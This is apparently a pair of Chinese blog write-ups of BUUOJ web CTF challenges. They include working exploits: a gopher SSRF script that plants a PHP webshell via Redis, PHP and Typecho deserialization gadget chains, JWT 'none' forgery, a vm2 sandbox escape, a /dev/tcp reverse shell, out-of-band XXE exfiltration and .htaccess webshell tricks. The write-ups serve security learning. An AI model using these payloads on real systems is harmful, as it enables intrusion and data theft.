[{"title":"buuoj-web02","url":"/2020/07/12/buuoj-web02/","content":"\n# [GKCTF2020]EZ三剑客-EzWeb\n注释`<!--?secret-->`  \n访问得回显  \n![](buuoj-web02/00.png)\n*此处容器有重启过所以ip地址会不同，实际上是一致的*\n给了内网ip，就可以考虑ssrf\n利用burpsuite扫描内网  \n![](01.png)  \n线程减小，太快会429\n(找返回长度明显和其他不一样的包来看)  \n回显\n```\n被你发现了,但你也许需要试试其他服♂务,就在这台机子上! ...我说的是端口啦1\n```\nip为:173.57.147.11  \n同样的步骤，扫端口，这个时候可能就凸显经验的重要性了...直接猜几个重要端口  \n>\nsqlserver： 1433\nMySQL： 3306\nOracle ： 1521\nhttp： 80\nhttps： 443\nredis： 6379\n回显\n```\n-ERR wrong number of arguments for 'get' command 1\n```\n端口是6379\n\n[CTF中SSRF的一些trick](https://xz.aliyun.com/t/4420#toc-3)\n[浅析Redis中SSRF的利用](https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/)  \n\n> 在RESP中，协议的不同部分始终以\"\\r\\n\"(CRLF)结束。\n\n利用绝对路径写webshell  \n执行脚本\n```py\n#py3\nimport urllib.parse\nprotocol=\"gopher://\"\nip=\"173.73.182.11\"\nport=\"6379\"\nshell=\"\\n\\n<?php eval($_GET[\\\"cmd\\\"]);?>\\n\\n\"\nfilename=\"shell.php\"\npath=\"/var/www/html\"\npasswd=\"\"\ncmd=[\"flushall\",\n\t \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t ]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/_\"\ndef redis_format(arr):\n\tCRLF=\"\\r\\n\"\n\tredis_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"*\"+str(len(redis_arr))\n\tfor x in redis_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif __name__==\"__main__\":\n\tfor x in cmd:\n\t\tpayload += urllib.parse.quote(redis_format(x))\n\tprint (payload)\n```\n得到payload\n`gopher://173.73.182.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A`\n读flag文件\n`http://173.73.182.11/shell.php?cmd=system('cat$IFS$9/flag');`\n\n# [GKCTF2020]EZ三剑客-EzTypecho\n给了源码  \n[typecho漏洞分析与HCTF实战](https://cloud.tencent.com/developer/article/1038270)\n>\n\\_\\_destruct()是在对象被销毁的时候自动调用\n\\_\\_wakeup()在反序列化的时候自动调用\n\\_\\_toString()是在调用对象的时候自动调用。\n\\_\\_get()会在读取不可访问的属性的值的时候调用\n\n在页面尝试，发现![](02.png)\n\n源码:\ninstall.php line231\n```php\nif(!isset($_SESSION)) { die('no, you can\\'t unserialize it without session QAQ');}\n$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));\nTypecho_Cookie::delete('__typecho_config');\n$db = new Typecho_Db($config['adapter'], $config['prefix']);\n$db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);\nTypecho_Db::set($db);\n```\n反序列化利用点↑，跟进get()函数   \n并且这里的`$db = new Typecho_Db($config['adapter'], $config['prefix']);`调用了对象\n\ncookie.php line83\n```php\npublic static function get($key, $default = NULL)\n{\n$key = self::$_prefix . $key;\n$value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);\nreturn is_array($value) ? $default : $value;\n}\n```\n1.cookie值是否存在\n2.$value是否是一个数组\n利用cookie或者POST传入  \n注意到在之前的代码中调用过了对象，可以利用`__toString()`  \n接下来全局搜索`__toString()` 找到可以利用的类(Typecho_Feed())\nfeed.php line284\n```php\nforeach ($this->_items as $item) {\n    $content .= '<item>' . self::EOL;\n    $content .= '<title>' . htmlspecialchars($item['title']) . '</title>' . self::EOL;\n    $content .= '<link>' . $item['link'] . '</link>' . self::EOL;\n    $content .= '<guid>' . $item['link'] . '</guid>' . self::EOL;\n    $content .= '<pubDate>' . $this->dateFormat($item['date']) . '</pubDate>' . self::EOL;\n    //给师傅们减轻负担QAQ，要加上$item['category'] = array(new Typecho_Request());和$this->_type防止500\n    $content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;\n```\n注意到`$item['author']->screenName`,跟进`$__items`\n\nfeed.php line112\n```php\nprivate $_items = array();\n```\n`$_items`是一个私有变量，由此可以联想到`__get()`函数  \n当执行`$item['author']->screenName`时已经用到了这个函数  \n跟进`__get()`全局搜索，最后可以追溯到(Typecho_Request())\nrequest.php line295  \n```php\npublic function get($key, $default = NULL)\n{\n    switch (true) {\n        case isset($this->_params[$key]):\n            $value = $this->_params[$key];\n            break;\n        case isset(self::$_httpParams[$key]):\n            $value = self::$_httpParams[$key];\n            break;\n        default:\n            $value = $default;\n            break;\n    }\n\n    $value = !is_array($value) && strlen($value) > 0 ? $value : $default;\n    return $this->_applyFilter($value);\n}\n```\n再跟进`__applyFilter($value)`\nrequest.php line159\n```php\nprivate function _applyFilter($value)\n{\n    if ($this->_filter) {\n        foreach ($this->_filter as $filter) {\n            $value = is_array($value) ? array_map($filter, $value) :\n            call_user_func($filter, $value);\n        }\n\n        $this->_filter = array();\n    }\n\n    return $value;\n}\n```\n注意到这里的`call_user_func()`，可以执行命令 \n\n>//给师傅们减轻负担QAQ，要加上$item['category'] = array(new Typecho_Request());和$this->\\_type防止500\n\n\npoc.php\n```php\n<?php\nclass Typecho_Feed\n{\n    const ATOM1 = 'ATOM 1.0';\n\n    private $_type;\n    private $_items;\n\n    public function __construct() {\n        $this->_type = $this::ATOM1;\n        $this->_items[0] = array(\n            'category' => array(new Typecho_Request()),\n            'author' => new Typecho_Request(),\n        );\n    }\n}\n\nclass Typecho_Request\n{\n    private $_params = array('screenName'=>'system(\"cat /flag\")');\n    private $_filter = array('assert');\n}\n\n$poc = array(\n    'adapter' => new Typecho_Feed(),\n    'prefix'  => 'typecho_'\n);\n\necho base64_encode(serialize($poc));\n?>\n\n```\ninstall.php line59\n```php\nif (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {\n        exit;\n    }\n// 挡掉可能的跨站请求\nif (!empty($_GET) || !empty($_POST)) {\n    if (empty($_SERVER['HTTP_REFERER'])) {\n        exit;\n    }\n\n    $parts = parse_url($_SERVER['HTTP_REFERER']);\n\tif (!empty($parts['port'])) {\n        $parts['host'] = \"{$parts['host']}:{$parts['port']}\";\n    }\n\n    if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {\n        exit;\n    }\n}\n```\n所以带上finish参数和Referer  \n同时检测了是否有$\\_\\_SESSION,但是在文件中session_start()已被注释  \n[Session 上传进度](https://www.php.net/manual/zh/session.upload-progress.php)\n![](04.png)\nexp.py\n```py\nimport requests\nurl='http://b114cfc5-a3ba-4ce4-be1c-41de9496d3a7.node3.buuoj.cn/install.php?finish=1'\nfiles={'file':123}\nheaders={'cookie':'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOToic3lzdGVtKCJjYXQgL2ZsYWciKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjE5OiJzeXN0ZW0oImNhdCAvZmxhZyIpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ==',\n 'Referer':'http://b114cfc5-a3ba-4ce4-be1c-41de9496d3a7.node3.buuoj.cn/install.php'}\nre=requests.post(url,files=files,headers=headers,data={\"PHP_SESSION_UPLOAD_PROGRESS\": \"123\"})\nprint(re.text)\n```\n\n# [GKCTF2020]老八小超市儿\n[渗透测试|shopxo后台全版本获取shell复现](http://www.nctry.com/1660.html)\n蚁剑连上`http://be4a445c-99ff-416a-ab18-dfe2fc32de64.node3.buuoj.cn/public/static/index/default/1.php`,在flag中发现flag在root下，但是root无法访问,在根目录下发现`auto.sh`\n```sh\n#!/bin/sh\nwhile true; do (python /var/mail/makeflaghint.py &) && sleep 60; done\n```\n找到这个py\n```py\nimport os\nimport io\nimport time\nos.system(\"whoami\")\ngk1=str(time.ctime())\ngk=\"\\nGet The RooT,The Date Is Useful!\"\nf=io.open(\"/flag.hint\", \"rb+\")\nf.write(str(gk1))\nf.write(str(gk))\nf.close()\n```\n直接把os.system()替换成`os.system('cat /root/flag>/1.txt')`\n","tags":["practice"]},{"title":"buuoj-web01","url":"/2020/07/12/buuoj-web01/","content":"buuoj-wp-web01\n\n# [HFCTF2020]EasyLogin\n![](00.png)\n注释中写了路径直接填了根目录，所以可能有任意文件读取的漏洞  \n\nkoa框架  \n关于koa的目录结构  \n![](01.png)\n~~图是偷的~~\n在controllers下的api.js找到关键代码 \n```js\nconst crypto = require('crypto');\nconst fs = require('fs')\nconst jwt = require('jsonwebtoken')\n\nconst APIError = require('../rest').APIError;\n\nmodule.exports = {\n    'POST /api/register': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || username === 'admin'){\n            throw new APIError('register error', 'wrong username');\n        }\n\n        if(global.secrets.length > 100000) {\n            global.secrets = [];\n        }\n\n        const secret = crypto.randomBytes(18).toString('hex');\n        const secretid = global.secrets.length;\n        global.secrets.push(secret)\n\n        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});\n\n        ctx.rest({\n            token: token\n        });\n\n        await next();\n    },\n\n    'POST /api/login': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || !password) {\n            throw new APIError('login error', 'username or password is necessary');\n        }\n\n        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;\n\n        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;\n\n        console.log(sid)\n\n        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n            throw new APIError('login error', 'no such secret id');\n        }\n\n        const secret = global.secrets[sid];\n\n        const user = jwt.verify(token, secret, {algorithm: 'HS256'});\n\n        const status = username === user.username && password === user.password;\n\n        if(status) {\n            ctx.session.username = username;\n        }\n\n        ctx.rest({\n            status\n        });\n\n        await next();\n    },\n\n    'GET /api/flag': async (ctx, next) => {\n        if(ctx.session.username !== 'admin'){\n            throw new APIError('permission error', 'permission denied');\n        }\n\n        const flag = fs.readFileSync('/flag').toString();\n        ctx.rest({\n            flag\n        });\n\n        await next();\n    },\n\n    'GET /api/logout': async (ctx, next) => {\n        ctx.session.username = null;\n        ctx.rest({\n            status: true\n        })\n        await next();\n    }\n};\n```\n需要让username=admin,之后再访问/flag就可以得到flag    \n```js\nconst token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});\n```\njwt伪造\n\n对于\n```js\nif(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n    throw new APIError('login error', 'no such secret id');\n}\n```\n对于sid>=0:js弱类型  \n>[]>=0   //true，数组\n\"\">=0  //true，字符串\n\n对于sid < global.secrets.length  \n注册以初始化全局变量secrets  \n\n>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJpYXQiOjE1ODg3NjI1NzN9.3IgFzoext6mvEihGuoEvscbdcRXtk9Abw1MolCaMeb4\n\n这样的形式代表的是base64(header).base64(payload).base64(signature)  \n当header中的alg为none时，后端将不执行签名验证  \n此时形式为:base64(header).base64(payload).  \n\n/api/register在body传入json值注册用户，得到token回显\n```js\n{\n    \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MiwidXNlcm5hbWUiOiJhYWEiLCJwYXNzd29yZCI6ImFhYSIsImlhdCI6MTU4ODgzODQyMX0.gqdlrjOgx2xBp-LA-0MVsw6LgGppnkp6tmmDiYQUDWw\"\n}\n```\n去掉签名算法\n```js\n{\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n},\n{\n  \"secretid\": [],\n  \"username\": \"admin\",\n  \"password\": \"admin\"\n}\n```\n这里用base64encode就行\n```\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjogImFkbWluIiwicGFzc3dvcmQiOiAiYWRtaW4iLCJpYXQiOiAxNTg4ODM4NDIxfQ.\n```\n在登录界面body传入username和password值,头中添加authorization传入token值  \n成功后访问/api/flag\n\n\n\n# [HFCTF2020]JustEscape\n![](02.png)\n执行命令?注意编码?不是php?  \n看一下run.php\n```php\n<?php\nif( array_key_exists( \"code\", $_GET ) && $_GET[ 'code' ] != NULL ) {\n    $code = $_GET['code'];\n    echo eval(code);\n} else {\n    highlight_file(__FILE__);\n}\n?>\n```\n有个eval()  \n利用异常抛出的语句确认后端使用的语言  \nrun.php?code=Error().stack\n>js中捕获异常堆栈信息—Error.stack\n\n得到\n![](03.png)\n=>1.nodejs 2.vm2\n[Node.js 常见漏洞学习与总结](https://xz.aliyun.com/t/7184)  \n[vm2-3.8.3逃逸issue](https://github.com/patriksimek/vm2/issues/225)  \n```\n/run.php?code=\n'(' + function(){\n    TypeError.prototype.get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n    }\n}+')()';\n```\n没什么反应,可能过滤了一些词  \n`exec` `constructor` `process` `prototype` `\"\"` `+`\n[模板字符串](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings)  \n可以利用模板字符串嵌套来拼接，用反引号来代替双引号  \n```\n/run.php?code=\n(function (){\n    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat ../flag`).toString();\n    }\n})()\n``` \n\n\n\n# [网鼎杯 2020 青龙组]AreUSerialz\n 中间因为补考鸽了好多天阿=。=，看一下错过的网鼎杯\nstr传值后,要满足is_valid的条件(基本上都能满足)  \n最终目的是read()读取flag.php  \n\n类里有protected private public三种类型的参数  \n[一文让PHP反序列化从入门到进阶](https://xz.aliyun.com/t/6753#toc-2)  \npublic参数不变，protected会变成 `%00*%00参数名`,private `%00类名%00参数名`  \n\\_\\_construct()会先执行  \n本地测试了以下，在类里魔术方法的执行优先级是大于其他方法的  \n如果说想要执行read,在read被调用之前就要使op==2，但是在这之前会首先执行__destruct，将op改为1  \n但是注意到这里__destruct()里的判断是`===`而write和read里的判断是`==`，可能是利用弱类型来绕过  \n[php弱类型安全](https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/)\n可以利用2e0绕过  \n\n因为payload里会出现%00字符，所以需要绕过is_valid()里的判断  \nphp版本是7.4.3，`php7.1+版本对属性类型不敏感`，就直接当成public即可  \n```\n <?php\nclass FileHandler {\n        public $op=2e0; \n        public $filename='flag.php';\n        public $content;\n}\n$a = new FileHandler();\necho serialize($a);\n?>\n```\n```\nO:11:\"FileHandler\":3:{s:2:\"op\";d:2;s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;}\n```\n\n# [网鼎杯 2020 青龙组]notes\n给了源码\n用的express框架，是node.js  \n在status路由下有个exec()函数，先留意下  \n还有一个不咋见过的undefsafe()  \n[undefsafe()](https://www.npmjs.com/package/undefsafe)\n[Prototype Pollution in undefsafe | Snyk](https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940)\n文章给的poc:\n```js\nvar a = require(\"undefsafe\");\nvar payload = \"__proto__.toString\";\na({},payload,\"JHU\");\nconsole.log({}.toString);\n```\n找到利用点\n```js\n    edit_note(id, author, raw) {\n        undefsafe(this.note_list, id + '.author', author);\n        undefsafe(this.note_list, id + '.raw_note', raw);\n    }\n```\n在/edit_note里传入  \nid=`__proto__`，author=`bash -i > /dev/tcp/ip/port 0>&1`，raw=`aaa`  \n之后访问/status使得payload能实现  \n~~不过端口收不到任何东西是什么鬼阿~~\no,原来是要用它提供的服务器来连接的\n\n# [网鼎杯 2020 青龙组]filejava\n~~懵~~\n传入文件后可以得到文件所在的路径  \n有任意文件上传的漏洞  \n[任意文件下载漏洞](https://bealright.github.io/2019/10/24/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/)  \n\n> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则  \n\n`POST /DownloadServlet?filename=../../../../WEB-INF/web.xml HTTP/1.1`读取servelet信息\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n    <servlet>\n        <servlet-name>DownloadServlet</servlet-name>\n        <servlet-class>cn.abc.servlet.DownloadServlet</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>DownloadServlet</servlet-name>\n        <url-pattern>/DownloadServlet</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>ListFileServlet</servlet-name>\n        <servlet-class>cn.abc.servlet.ListFileServlet</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>ListFileServlet</servlet-name>\n        <url-pattern>/ListFileServlet</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>UploadServlet</servlet-name>\n        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>UploadServlet</servlet-name>\n        <url-pattern>/UploadServlet</url-pattern>\n    </servlet-mapping>\n</web-app>\n``` \n`/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中`\n\n> 对于`cn.abc.servlet.DownloadServlet`来说，相对地址是`WEB-INF/classes/cn/abc/servlet/DownloadServlet.class`\n\n下载.class文件进行反编译  \n在uploadservlet里有\n```java\nif (filename.startsWith(\"excel-\") && \"xlsx\".equals(fileExtName)) {\n                        try {\n                            final Workbook wb1 = WorkbookFactory.create(in);\n                            final Sheet sheet = wb1.getSheetAt(0);\n                            System.out.println(sheet.getFirstRowNum());\n                        }\n                        catch (InvalidFormatException e) {\n                            System.err.println(\"poi-ooxml-3.10 has something wrong\");\n                            e.printStackTrace();\n                        }\n                    }\n```\n[利用 EXCEL 文件進行 XXE 攻擊的漏洞分析](https://www.jishuwen.com/d/2inW/zh-hk)  \n当时是给了hint?buuoj上没有/flag的hint  \n新建一个excel-.xlsx文件后,改后缀为zip进行解压，修改[Content-Types].xml的内容\n```xml\n<!DOCTYPE ANY[\n    <!ENTITY % file SYSTEM \"file:///flag\">\n    <!ENTITY % remote SYSTEM 'http://ip:port/xxe.dtd'>\n    %remote;\n    %all;\n]>\n<root>&send;</root>\n```\nxxe.dtd：(放在根目录下)\n```dtd\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://ip:port/%file;'>\">\n```\n修改内容后把文档压缩成xlsx文件，上传\n之后查看apache的access.log  \n~~但是还是没有收到~~  \n\n# [XNUCA2019Qualifier]EasyPHP\n利用file_put_contents在文件中写入shell  \n$content过滤`on` `html` `type` `flag` `upload` `file`\n$filename使用[a-z.]\n\n>由于题目服务器中间件为apache，因此想到了传.htaceess来解析php\n\n\n重写覆盖.htaccess文件\n\n### 预期解\n>include_path用来设置include()或require()函数包含文件的参考路径，当使用include()或require()函数包含文件的时候,程序首先以include_path设置的路径作为参考点去找文件,如果找不到,则以程序自身所在的路径为参考点去找所要的文件\n\n当文件中包含一个不存在的fl3g.php会报错\n\n>error_log可以把错误日志保存到指定的目录中,log_errors为1开启错误记录\n\n报错时会把错误信息保存至某一文件中，利用php_value来设置这个文件  \n\n>.htaccess中出现无意义字符再访问当前目录文件服务器将500\n\n上传的.htaccess要注释后边的`\\njust one chance`\napache的规则是注释要另起一行\n`\\`有拼接上下两行的功能  \n.htaccess只支持单行注释，可以利用`#\\`来注释掉后边的字符串  \n\n> error_log的内容默认是htmlentities的\n\n可以使用utf-7编码绕过  \n\n.htaccess:\n```\nphp_value error_log /tmp/fl3g.php\nphp_value error_reporting 32767\nphp_value include_path \"+ADw?php eval($_GET[a])+ADs +AF8AXw-halt+AF8-compiler()+ADs\"\n# \\\n```\n访问index.php之后会留下错误记录再写入新的.htaccess\n```\nphp_value include_path \"/tmp\"\nphp_value zend.multibyte 1\nphp_value zend.script_encoding \"UTF-7\"\n# \\\n```\n>zend.multibyte 1 #进行编码\n>zend.script_encoding \"UTF-7\"  #指定utf-7编码\n\n再次访问index.php向a传入payload \n\n### 非预期\n利用`\\`拼接上下两行来绕过对file的检测\n```\nphp_value auto_prepend_fi\\\nle \".htaccess\"\n```\nauto_pretend_file的作用也是调用第三方文件  \n可以通过errordocument 404来自定义404界面，输出payload回显  \n```\nfilename=.htaccess&content=php_value%20auto_prepend_fi\\%0Ale%20\".htaccess\"%0AErrorDocument%20404%20\"<?php%20system(\\'cat%20../../../fl[a]g\\');?>\\\\\n```\n# [MRCTF2020]Ezpop\n```\n__wakeup() //使用unserialize时触发\n__sleep() //使用serialize时触发\n__destruct() //对象被销毁时触发\n__call() //在对象上下文中调用不可访问的方法时触发\n__callStatic() //在静态上下文中调用不可访问的方法时触发\n__get() //用于从不可访问（或不存在）的属性(protect private)读取数据\n__set() //用于将数据写入不可访问的属性\n__isset() //在不可访问的属性上调用isset()或empty()触发\n__unset() //在不可访问的属性上使用unset()时触发\n__toString() //把类当作字符串使用时触发\n__invoke() //当尝试将对象调用为函数时触发\n```\nModifier():include()可以包含flag.php，需要将对象调用为函数时触发__invoke()  \nTest():利用protected  $var调用__get()返回一个函数  \nShow():echo一个类触发__toString  \n我们的目的是得到include(flag.php)并通过__toString打印出来  \n\n\n给\\$this->source传入new show(),触发__toString(),此时因为Test()里没有\\$source可以访问所以会触发__get()  \n让\\$p=new Modifier()触发__invoke()\n\nexp:\n```php\n<?php\nclass Modifier {\n  protected  $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";\n\n}\n\n\nclass Test{\n    public $p;\n}\n\nclass Show{\n    public $source;\n    public $str;\n}\n\n\n$a = new Show();\n$a->source = new Show();\n$a->source->str=new Test();\n$a->source->str->p = new Modifier();\n\necho urlencode(serialize($a));\n\n?>\n```\n\n# [ISITDTU 2019]EasyPHP\n这题咋这么眼熟....  \n给了源码\n```php\n<?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET['_'];\nif ( preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', $_) )\n    die('rosé will not do it');\n\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n\neval($_);\n?>\n```\n```php\n<?php\n\nfor ($ascii = 0; $ascii < 256; $ascii++) {\n    \n    if (!preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', chr($ascii))) {\n        echo chr($ascii);\n    }\n}\n?>\n```\n打印没过滤的字符 \n```\n! # % ( ) * + - / : ; < = > ? @ A B C H I J K L M N Q R T U V W X Y Z \\ ] ^ a b c h i j k l m n q r t u v w x y z } ~ \n```\n[PHP不使用数字,字母和下划线写shell](https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/)\n>count_chars — 返回字符串所用字符的信息\n\n第二个if语句的意思是$\\_的不重复的字符长度要<=13  \n取反构造phpinfo();进行测试\n```\necho urlencode(~\"phpinfo\");\n```\n`?_=(~%8F%97%8F%96%91%99%90)();`\n有回显\n接下来构造payload探测目录找flag  \n目的是`?_=print_r(scandir(.))`\n```\n.->%D1\nscandir-> %8C%9C%9E%91%9B%96%8D\nprint_r-> %8F%8D%96%91%8B%A0%8D\n```\n长度超出限制  \n通过异或减少不同的字符，我们需要保留的是`();~%ff`还可以留有8个不同的字符\n\n```py\ntable = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original \n#count_char(\"scandirprint_r.\",0x3)==11\n#[t,d,_,c,p,n,a,.,i,r,s]\nresult = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c] #when len(temp)==11  \ntemp = []\nfor d in table:\n    for a in result:\n        for b in result:\n            for c in result:\n                if (a ^ b ^ c == d):\n                    if a == b == c == d:\n                        continue\n                    else:\n                        print(\"a=0x%x,b=0x%x,c=0x%x,d=0x%x\" % (a, b, c, d))\n                        if d not in temp:\n                            temp.append(d)\nprint(len(temp), temp)\n```\n\n整理之后有\n```\n?_=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%9e%9b%9c%9c%9b%8f)^(%8f%8f%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));\n```\n回显\n>Array ( [0] => . [1] => .. [2] => index.php [3] => n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )\n\n所以有 `readfile(end(scandir(.)))` `show_source(end(scandir(.)))`\n改一下脚本的table和result\n```py\ntable=[0xa0, 0x88, 0x8a, 0x8c, 0x8d,0x90,0x91,0xd1,0x96,0x97,0x9a,0x9b,0x9c,0x9e]\nresult=[0xa0, 0x88,0x8d,0xd1,0x97,0x9a,0x9b,0x9c]\n```\n有\n```\n?_=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));\n```\n\n# [GYCTF2020]Node Game\nnode.js express\n```js\napp.get('/', function(req, res) {\n    var action = req.query.action?req.query.action:\"index\";\n    if( action.includes(\"/\") || action.includes(\"\\\\\") ){\n        res.send(\"Errrrr, You have been Blocked\");\n    }\n    file = path.join(__dirname + '/template/'+ action +'.pug');\n    var html = pug.renderFile(file); //渲染pug文件\n    res.send(html);\n});\n```\n上传pug文件，在/template/下\n```js\napp.post('/file_upload', function(req, res){\n    var ip = req.connection.remoteAddress;\n    var obj = {\n        msg: '',\n    }\n    if (!ip.includes('127.0.0.1')) {\n        obj.msg=\"only admin's ip can use it\"\n        res.send(JSON.stringify(obj));\n        return \n    }\n    fs.readFile(req.files[0].path, function(err, data){\n        if(err){\n            obj.msg = 'upload failed';\n            res.send(JSON.stringify(obj));\n        }else{\n            var file_path = '/uploads/' + req.files[0].mimetype +\"/\";\n            var file_name = req.files[0].originalname\n            var dir_file = __dirname + file_path + file_name\n            if(!fs.existsSync(__dirname + file_path)){\n                try {\n                    fs.mkdirSync(__dirname + file_path)\n                } catch (error) {\n                    obj.msg = \"file type error\";\n                    res.send(JSON.stringify(obj));\n                  